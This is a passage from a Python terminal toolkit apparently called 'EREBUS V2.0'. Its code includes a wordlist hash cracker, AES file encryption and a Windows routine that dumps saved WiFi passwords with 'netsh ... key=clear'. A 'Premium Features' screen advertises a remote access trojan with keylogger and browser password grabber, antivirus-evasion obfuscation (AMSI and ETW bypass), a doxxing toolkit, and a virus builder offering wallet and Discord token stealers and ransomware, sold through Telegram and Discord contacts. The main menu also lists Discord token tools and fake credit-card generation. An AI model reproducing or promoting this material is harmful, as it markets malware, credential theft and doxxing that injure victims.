                print(f"{Colors.GREEN}[{key:>2}]{Colors.END}  {value}")
            
            choice = input(f"\n{Colors.BLUE}[?] Select option ➔ {Colors.END}").strip()
            
            if choice == '99':
                break
            elif choice == '1':
                SecurityTools.password_generator()
            elif choice == '2':
                SecurityTools.password_checker()
            elif choice == '3':
                SecurityTools.hash_generator()
            elif choice == '4':
                SecurityTools.hash_cracker()
            elif choice == '5':
                SecurityTools.encrypt_file()
            elif choice == '6':
                SecurityTools.decrypt_file()
            elif choice == '7':
                SecurityTools.wifi_viewer()
            elif choice == '8':
                SecurityTools.system_info()
            else:
                print(f"{Colors.RED}[!] Invalid option{Colors.END}")
                time.sleep(1)
    
    @staticmethod
    def password_generator():
        clear_screen()
        print_section("PASSWORD GENERATOR")
        
        try:
            length = int(input(f"{Colors.GREEN}[?] Password length: {Colors.END}").strip())
        except:
            length = 16
        
        use_upper = input(f"{Colors.GREEN}[?] Include uppercase? (y/n): {Colors.END}").strip().lower() == 'y'
        use_lower = input(f"{Colors.GREEN}[?] Include lowercase? (y/n): {Colors.END}").strip().lower() == 'y'
        use_digits = input(f"{Colors.GREEN}[?] Include digits? (y/n): {Colors.END}").strip().lower() == 'y'
        use_special = input(f"{Colors.GREEN}[?] Include special chars? (y/n): {Colors.END}").strip().lower() == 'y'
        
        chars = ''
        if use_upper:
            chars += string.ascii_uppercase
        if use_lower:
            chars += string.ascii_lowercase
        if use_digits:
            chars += string.digits
        if use_special:
            chars += '!@#$%^&*()_+-=[]{}|;:,.<>?'
        
        if not chars:
            chars = string.ascii_letters + string.digits
        
        password = ''.join(random.choice(chars) for _ in range(length))
        
        print(f"\n{Colors.GREEN}Generated Password: {Colors.END}{password}")
        
        # Calculate strength
        strength = 0
        if use_upper: strength += 26
        if use_lower: strength += 26
        if use_digits: strength += 10
        if use_special: strength += 32
        
        entropy = length * (strength.bit_length())
        print(f"{Colors.GREEN}Entropy: {Colors.END}{entropy} bits")
        
        if entropy < 40:
            print(f"{Colors.RED}Strength: Very Weak{Colors.END}")
        elif entropy < 60:
            print(f"{Colors.YELLOW}Strength: Weak{Colors.END}")
        elif entropy < 80:
            print(f"{Colors.CYAN}Strength: Moderate{Colors.END}")
        elif entropy < 100:
            print(f"{Colors.BLUE}Strength: Strong{Colors.END}")
        else:
            print(f"{Colors.GREEN}Strength: Very Strong{Colors.END}")
        
        filename = f"generated_password_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w') as f:
            f.write(password)
        
        print(f"{Colors.GREEN}[✓] Saved to {filename}{Colors.END}")
        press_enter()
    
    @staticmethod
    def password_checker():
        clear_screen()
        print_section("PASSWORD STRENGTH CHECKER")
        
        password = input(f"{Colors.GREEN}[?] Enter password to check: {Colors.END}").strip()
        
        score = 0
        feedback = []
        
        # Length check
        if len(password) >= 12:
            score += 2
            feedback.append(f"{Colors.GREEN}✓ Good length{Colors.END}")
        elif len(password) >= 8:
            score += 1
            feedback.append(f"{Colors.YELLOW}⚠ Acceptable length{Colors.END}")
        else:
            feedback.append(f"{Colors.RED}✗ Too short{Colors.END}")
        
        # Character variety
        if re.search(r'[A-Z]', password):
            score += 1
            feedback.append(f"{Colors.GREEN}✓ Has uppercase{Colors.END}")
        else:
            feedback.append(f"{Colors.RED}✗ No uppercase{Colors.END}")
        
        if re.search(r'[a-z]', password):
            score += 1
            feedback.append(f"{Colors.GREEN}✓ Has lowercase{Colors.END}")
        else:
            feedback.append(f"{Colors.RED}✗ No lowercase{Colors.END}")
        
        if re.search(r'\d', password):
            score += 1
            feedback.append(f"{Colors.GREEN}✓ Has digits{Colors.END}")
        else:
            feedback.append(f"{Colors.RED}✗ No digits{Colors.END}")
        
        if re.search(r'[!@#$%^&*()_+\-=\[\]{}|;:,.<>?]', password):
            score += 1
            feedback.append(f"{Colors.GREEN}✓ Has special chars{Colors.END}")
        else:
            feedback.append(f"{Colors.RED}✗ No special chars{Colors.END}")
        
        # Common patterns
        if re.search(r'(123|abc|qwerty|password|admin)', password.lower()):
            score -= 1
            feedback.append(f"{Colors.RED}✗ Contains common pattern{Colors.END}")
        
        # Repeated chars
        if re.search(r'(.)\1{2,}', password):
            score -= 1
            feedback.append(f"{Colors.RED}✗ Has repeated characters{Colors.END}")
        
        print(f"\n{Colors.CYAN}═══════════ STRENGTH ANALYSIS ═══════════{Colors.END}")
        for line in feedback:
            print(line)
        
        print(f"\n{Colors.CYAN}Score: {Colors.END}{score}/7")
        
        if score <= 2:
            print(f"{Colors.RED}Overall: Very Weak{Colors.END}")
        elif score <= 4:
            print(f"{Colors.YELLOW}Overall: Weak{Colors.END}")
        elif score <= 5:
            print(f"{Colors.CYAN}Overall: Moderate{Colors.END}")
        elif score <= 6:
            print(f"{Colors.BLUE}Overall: Strong{Colors.END}")
        else:
            print(f"{Colors.GREEN}Overall: Very Strong{Colors.END}")
        
        press_enter()
    
    @staticmethod
    def hash_generator():
        clear_screen()
        print_section("HASH GENERATOR")
        
        text = input(f"{Colors.GREEN}[?] Enter text to hash: {Colors.END}").strip()
        
        print(f"\n{Colors.CYAN}═══════════ HASHES ═══════════{Colors.END}")
        print(f"{Colors.GREEN}MD5: {Colors.END}{hashlib.md5(text.encode()).hexdigest()}")
        print(f"{Colors.GREEN}SHA1: {Colors.END}{hashlib.sha1(text.encode()).hexdigest()}")
        print(f"{Colors.GREEN}SHA224: {Colors.END}{hashlib.sha224(text.encode()).hexdigest()}")
        print(f"{Colors.GREEN}SHA256: {Colors.END}{hashlib.sha256(text.encode()).hexdigest()}")
        print(f"{Colors.GREEN}SHA384: {Colors.END}{hashlib.sha384(text.encode()).hexdigest()}")
        print(f"{Colors.GREEN}SHA512: {Colors.END}{hashlib.sha512(text.encode()).hexdigest()}")
        
        filename = f"hashes_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w') as f:
            f.write(f"Text: {text}\n")
            f.write(f"MD5: {hashlib.md5(text.encode()).hexdigest()}\n")
            f.write(f"SHA256: {hashlib.sha256(text.encode()).hexdigest()}\n")
        
        print(f"\n{Colors.GREEN}[✓] Saved to {filename}{Colors.END}")
        press_enter()
    
    @staticmethod
    def hash_cracker():
        clear_screen()
        print_section("HASH CRACKER")
        
        hash_value = input(f"{Colors.GREEN}[?] Enter hash: {Colors.END}").strip()
        
        # Detect hash type
        hash_length = len(hash_value)
        hash_type = "Unknown"
        
        if hash_length == 32:
            hash_type = "MD5"
        elif hash_length == 40:
            hash_type = "SHA1"
        elif hash_length == 56:
            hash_type = "SHA224"
        elif hash_length == 64:
            hash_type = "SHA256"
        elif hash_length == 96:
            hash_type = "SHA384"
        elif hash_length == 128:
            hash_type = "SHA512"
        
        print(f"{Colors.CYAN}[*] Detected hash type: {hash_type}{Colors.END}")
        
        wordlist_path = input(f"{Colors.GREEN}[?] Path to wordlist (or press Enter for demo): {Colors.END}").strip()
        
        if not wordlist_path:
            # Demo with common passwords
            common = ['password', '123456', 'qwerty', 'admin', 'letmein', 'welcome']
            print(f"{Colors.CYAN}[*] Trying common passwords...{Colors.END}")
            
            found = False
            for word in common:
                if hashlib.md5(word.encode()).hexdigest() == hash_value:
                    print(f"{Colors.GREEN}[✓] Found: {word}{Colors.END}")
                    found = True
                    break
                elif hashlib.sha1(word.encode()).hexdigest() == hash_value:
                    print(f"{Colors.GREEN}[✓] Found: {word}{Colors.END}")
                    found = True
                    break
                elif hashlib.sha256(word.encode()).hexdigest() == hash_value:
                    print(f"{Colors.GREEN}[✓] Found: {word}{Colors.END}")
                    found = True
                    break
            
            if not found:
                print(f"{Colors.RED}[!] Hash not found in common passwords{Colors.END}")
        else:
            try:
                with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                    words = f.readlines()
                
                print(f"{Colors.CYAN}[*] Cracking with {len(words)} words...{Colors.END}")
                
                for word in words:
                    word = word.strip()
                    if hashlib.md5(word.encode()).hexdigest() == hash_value:
                        print(f"{Colors.GREEN}[✓] Found: {word}{Colors.END}")
                        break
                    elif hashlib.sha1(word.encode()).hexdigest() == hash_value:
                        print(f"{Colors.GREEN}[✓] Found: {word}{Colors.END}")
                        break
                    elif hashlib.sha256(word.encode()).hexdigest() == hash_value:
                        print(f"{Colors.GREEN}[✓] Found: {word}{Colors.END}")
                        break
                else:
                    print(f"{Colors.RED}[!] Hash not found{Colors.END}")
            
            except Exception as e:
                print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
        
        press_enter()
    
    @staticmethod
    def encrypt_file():
        clear_screen()
        print_section("ENCRYPT FILE (AES)")
        
        if not HAS_CRYPTO:
            print(f"{Colors.RED}[!] pycryptodome module not installed{Colors.END}")
            press_enter()
            return
        
        file_path = input(f"{Colors.GREEN}[?] Path to file: {Colors.END}").strip()
        
        if not os.path.exists(file_path):
            print(f"{Colors.RED}[!] File not found{Colors.END}")
            press_enter()
            return
        
        password = input(f"{Colors.GREEN}[?] Encryption password: {Colors.END}").strip()
        
        try:
             
            key = hashlib.sha256(password.encode()).digest()
            
            # Generate random IV
            iv = Crypto.Random.get_random_bytes(16)
            
           
            cipher = AES.new(key, AES.MODE_CBC, iv)
            
          
            with open(file_path, 'rb') as f:
                plaintext = f.read()
            
            padded = pad(plaintext, AES.block_size)
            
          
            ciphertext = cipher.encrypt(padded)
            
          
            output_path = file_path + '.enc'
            with open(output_path, 'wb') as f:
                f.write(iv + ciphertext)
            
            print(f"{Colors.GREEN}[✓] File encrypted: {output_path}{Colors.END}")
        
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
        
        press_enter()
    
    @staticmethod
    def decrypt_file():
        clear_screen()
        print_section("DECRYPT FILE (AES)")
        
        if not HAS_CRYPTO:
            print(f"{Colors.RED}[!] pycryptodome module not installed{Colors.END}")
            press_enter()
            return
        
        file_path = input(f"{Colors.GREEN}[?] Path to encrypted file: {Colors.END}").strip()
        
        if not os.path.exists(file_path):
            print(f"{Colors.RED}[!] File not found{Colors.END}")
            press_enter()
            return
        
        password = input(f"{Colors.GREEN}[?] Decryption password: {Colors.END}").strip()
        
        try:
            # Generate key from password
            key = hashlib.sha256(password.encode()).digest()
            
            # Read encrypted file
            with open(file_path, 'rb') as f:
                iv = f.read(16)
                ciphertext = f.read()
            
            # Create cipher
            cipher = AES.new(key, AES.MODE_CBC, iv)
            
            # Decrypt
            decrypted = cipher.decrypt(ciphertext)
            plaintext = unpad(decrypted, AES.block_size)
            
            # Save decrypted file
            if file_path.endswith('.enc'):
                output_path = file_path[:-4]
            else:
                output_path = file_path + '.dec'
            
            with open(output_path, 'wb') as f:
                f.write(plaintext)
            
            print(f"{Colors.GREEN}[✓] File decrypted: {output_path}{Colors.END}")
        
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
        
        press_enter()
    
    @staticmethod
    def wifi_viewer():
        clear_screen()
        print_section("WIFI PASSWORD VIEWER")
        
        if os.name == 'nt':  # Windows
            try:
                # Get all profiles
                data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors='ignore').split('\n')
                profiles = []
                
                for line in data:
                    if "All User Profile" in line:
                        profile = line.split(':')[1].strip()
                        profiles.append(profile)
                
                print(f"{Colors.CYAN}[*] Found {len(profiles)} WiFi profiles{Colors.END}\n")
                
                for profile in profiles:
                    try:
                        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('utf-8', errors='ignore').split('\n')
                        for line in results:
                            if "Key Content" in line:
                                password = line.split(':')[1].strip()
                                print(f"{Colors.GREEN}{profile}: {Colors.END}{password}")
                                break
                        else:
                            print(f"{Colors.YELLOW}{profile}: No password stored{Colors.END}")
                    except:
                        print(f"{Colors.RED}{profile}: Error getting password{Colors.END}")
                
            except Exception as e:
                print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
        
        elif os.name == 'posix':  # Linux/Mac
            print(f"{Colors.YELLOW}[!] WiFi password viewer not implemented for this OS{Colors.END}")
        
        press_enter()
    
    @staticmethod
    def system_info():
        clear_screen()
        print_section("SYSTEM INFORMATION")
        
        if not HAS_PSUTIL:
            print(f"{Colors.RED}[!] psutil module not installed{Colors.END}")
            press_enter()
            return
        
        print(f"{Colors.CYAN}═══════════ SYSTEM INFO ═══════════{Colors.END}")
        print(f"{Colors.GREEN}System: {Colors.END}{platform.system()} {platform.release()}")
        print(f"{Colors.GREEN}Node: {Colors.END}{platform.node()}")
        print(f"{Colors.GREEN}Processor: {Colors.END}{platform.processor()}")
        print(f"{Colors.GREEN}Architecture: {Colors.END}{platform.machine()}")
        
        # CPU
        print(f"\n{Colors.CYAN}═══════════ CPU INFO ═══════════{Colors.END}")
        print(f"{Colors.GREEN}Physical cores: {Colors.END}{psutil.cpu_count(logical=False)}")
        print(f"{Colors.GREEN}Total cores: {Colors.END}{psutil.cpu_count(logical=True)}")
        print(f"{Colors.GREEN}CPU Usage: {Colors.END}{psutil.cpu_percent(interval=1)}%")
        
        # Memory
        memory = psutil.virtual_memory()
        print(f"\n{Colors.CYAN}═══════════ MEMORY INFO ═══════════{Colors.END}")
        print(f"{Colors.GREEN}Total: {Colors.END}{memory.total / (1024**3):.2f} GB")
        print(f"{Colors.GREEN}Available: {Colors.END}{memory.available / (1024**3):.2f} GB")
        print(f"{Colors.GREEN}Used: {Colors.END}{memory.used / (1024**3):.2f} GB ({memory.percent}%)")
        
        # Disk
        disk = psutil.disk_usage('/')
        print(f"\n{Colors.CYAN}═══════════ DISK INFO ═══════════{Colors.END}")
        print(f"{Colors.GREEN}Total: {Colors.END}{disk.total / (1024**3):.2f} GB")
        print(f"{Colors.GREEN}Used: {Colors.END}{disk.used / (1024**3):.2f} GB ({disk.percent}%)")
        print(f"{Colors.GREEN}Free: {Colors.END}{disk.free / (1024**3):.2f} GB")
        
        # Network
        print(f"\n{Colors.CYAN}═══════════ NETWORK INFO ═══════════{Colors.END}")
        for interface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    print(f"{Colors.GREEN}{interface}: {Colors.END}{addr.address}")
        
        press_enter()


class PremiumFeatures:
    @staticmethod
    def menu():
        while True:
            clear_screen()
            print_section("PREMIUM FEATURES")
            
            premium_text = f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════╗
║                    🔥 PREMIUM EXCLUSIVES 🔥                     ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}

{Colors.YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.END}

{Colors.GREEN}█▓▒° RAT (Remote Access Trojan) °▒▓█{Colors.END}
{Colors.CYAN}├─ Full remote control of victim's PC{Colors.END}
{Colors.CYAN}├─ File system access & manipulation{Colors.END}
{Colors.CYAN}├─ Keylogger with email reports{Colors.END}
{Colors.CYAN}├─ Webcam & microphone streaming{Colors.END}
{Colors.CYAN}├─ Desktop streaming in real-time{Colors.END}
{Colors.CYAN}├─ Password grabber from all browsers{Colors.END}

{Colors.GREEN}█▓▒° OBFUSCATOR PRO °▒▓█{Colors.END}
{Colors.CYAN}├─ AES-256 encryption for payloads{Colors.END}
{Colors.CYAN}├─ Polymorphic code generator{Colors.END}
{Colors.CYAN}├─ Anti-VM & Anti-sandbox bypass{Colors.END}
{Colors.CYAN}├─ AMSI bypass techniques{Colors.END}
{Colors.CYAN}├─ ETW patching{Colors.END}
{Colors.CYAN}├─ String obfuscation & mutation{Colors.END}

{Colors.GREEN}█▓▒° DOX TOOLKIT °▒▓█{Colors.END}
{Colors.CYAN}├─ Advanced OSINT automation{Colors.END}
{Colors.CYAN}├─ Phone number deep dive{Colors.END}
{Colors.CYAN}├─ Email breach database (8 billion records){Colors.END}
{Colors.CYAN}├─ Social media account discovery{Colors.END}
{Colors.CYAN}├─ Dark web monitoring{Colors.END}
{Colors.CYAN}├─ Facial recognition search{Colors.END}

{Colors.GREEN}█▓▒° VIRUS BUILDER °▒▓█{Colors.END}
{Colors.CYAN}├─ Wallet Stealer {Colors.END}
{Colors.CYAN}├─ Browser Injection {Colors.END}
{Colors.CYAN}├─ Discord Token Stealer{Colors.END}
{Colors.CYAN}├─ R4nsomw4re {Colors.END}
{Colors.CYAN}├─ Crypter & Binder{Colors.END}
{Colors.CYAN}└─ Spread Mechanisms (USB, Network, Email){Colors.END}

{Colors.YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.END}

{Colors.RED}╔═══════════════════════════════════════════════════════════════╗
║                 🚀 HOW TO ACCESS 🚀                          ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}

{Colors.GREEN}► Contact @More_Dark on Telegram{Colors.END}
{Colors.GREEN}► Contact Nexus.log on Discord{Colors.END}
{Colors.GREEN}► Include your Torjan-Osint username(will be used to register your premium access){Colors.END}



{Colors.RED}⚡ Telegram: https://t.me/More_Dark{Colors.END}
{Colors.RED}⚡ Discord: Nexus.log{Colors.END}

{Colors.CYAN}═══════════════════════════════════════════════════════════════{Colors.END}
"""
            print(premium_text)
            
            print(f"\n{Colors.BLUE}[99] Back to Main Menu{Colors.END}")
            choice = input(f"{Colors.GREEN}[?] Select: {Colors.END}").strip()
            
            if choice == '99':
                break
            else:
                print(f"{Colors.RED}[!] Invalid option{Colors.END}")
                time.sleep(1)


def main_menu():
    """Main menu loop"""
    check_version() 
    while True:
        clear_screen()
        print_banner()
        
        menu = f"""
{Colors.CYAN}╔═══════════════════════════════════════════════════════════════╗
║                      Mᴀɪɴ Mᴇɴᴜ                                      
╠═══════════════════════════════════════════════════════════════╣
║                                                                       
║  {Colors.GREEN}[01]{Colors.END}  Dɪꜰᴄᴏʀᴅ Tᴏᴋᴇɴ Tᴏᴏʟꜱ        {Colors.GREEN}[06]{Colors.END}  OSINT Tᴏᴏʟꜱ                
║  {Colors.GREEN}[02]{Colors.END}  Dɪꜰᴄᴏʀᴅ Bᴏᴛ Tᴏᴏʟꜱ          {Colors.GREEN}[07]{Colors.END}  Dᴏᴍᴀɪɴ Sᴇᴄᴜʀɪᴛʏ            
║  {Colors.GREEN}[03]{Colors.END}  Wᴇʙʜᴏᴏᴋ Tᴏᴏʟꜱ              {Colors.GREEN}[08]{Colors.END}  Fᴀᴋᴇ Iɴꜰᴏ & CC Gᴇɴ         
║  {Colors.GREEN}[04]{Colors.END}  Sᴇʀᴠᴇʀ/Nɪᴛʀᴏ Tᴏᴏʟꜱ         {Colors.GREEN}[09]{Colors.END}  Sᴇᴄᴜʀɪᴛʏ Tᴏᴏʟꜱ             
║  {Colors.GREEN}[05]{Colors.END}  Rᴏʙʟᴏx Tᴏᴏʟꜱ               {Colors.GREEN}[10]{Colors.END}  Pʀᴇᴍɪᴜᴍ Fᴇᴀᴛᴜʀᴇꜱ          
║                                                                       
║  {Colors.RED}[00]{Colors.END}  E x i t                                         
║                                                                       
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
"""
        print(menu)
        
        choice = input(f"{Colors.BLUE}[?] Sᴇʟᴇᴄᴛ ᴏᴘᴛɪᴏɴ ➔ {Colors.END}").strip()
        
        if choice == '00':
            print(f"{Colors.RED}[!] Exiting...{Colors.END}")
            sys.exit(0)
        elif choice == '01':
            DiscordTokenTools.menu()
        elif choice == '02':
            DiscordBotTools.menu()
        elif choice == '03':
            WebhookTools.menu()
        elif choice == '04':
            ServerNitroTools.menu()
        elif choice == '05':
            RobloxTools.menu()
        elif choice == '06':
            OsintTools.menu()
        elif choice == '07':
            DomainSecurityTools.menu()
        elif choice == '08':
            FakeInfoTools.menu()
        elif choice == '09':
            SecurityTools.menu()
        elif choice == '10':
            PremiumFeatures.menu()
        else:
            print(f"{Colors.RED}[!] Invalid option{Colors.END}")
            time.sleep(1)


if __name__ == "__main__":
    try:
        
        try:
            import platform
        except:
            pass
        
        clear_screen()
        print_banner()
        print(f"{Colors.CYAN}[*] Loading EREBUS V2.0...{Colors.END}")
        time.sleep(1)
        main_menu()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Interrupted{Colors.END}")
        sys.exit(0)
    except Exception as e:
        print(f"{Colors.RED}[!] Fatal Error: {e}{Colors.END}")
        sys.exit(1)

